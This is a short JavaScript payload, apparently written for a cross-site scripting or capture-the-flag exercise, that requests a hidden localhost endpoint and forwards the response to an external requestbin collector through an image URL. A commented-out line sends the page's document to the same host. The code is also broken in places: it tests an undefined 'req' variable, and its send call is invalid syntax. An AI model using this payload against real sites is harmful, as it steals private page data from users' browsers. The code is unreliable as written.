var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost/3f44a20bf3018a4d63609cc8e062ff88b4648ff585c81d6b802d0e89038ef195995bf23e514eb2e90f9a5e4a74427476ac1222e4677d0b292c5153571ce44144/check_spam', true);

xhr.onreadystatechange = function() { 
  // If the request completed, close the extension popup
  if (req.readyState == 4)
    if (req.status == 200) {
        var data = xhr.response;
        Image().src = "http://requestbin.fullcontact.com/10tmuur1?data=" + data;
    }
};

xhr.send({toto='toto'});

//new Image().src="http://requestbin.fullcontact.com/10tmuur1?msg="+document;